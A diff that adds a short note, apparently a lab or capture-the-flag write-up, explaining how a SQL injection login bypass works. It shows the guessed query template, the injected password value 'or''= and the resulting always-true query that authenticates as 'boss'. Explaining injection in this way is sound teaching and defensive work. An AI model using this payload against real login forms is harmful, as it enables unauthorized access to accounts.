@@ -1,0 +1,9 @@
+we begin by guessing the SQL command
+
+SELECT .... WHERE user_id='$user_id' AND password='$password'
+
+we trick the system into authenticating up by injecting 'or''= into the password field, this would result in the final query being:
+
+SELECT .... WHERE user_id='boss' AND password=''or''=''
+
+''='' always return true, and therefore we're authenticated by the server
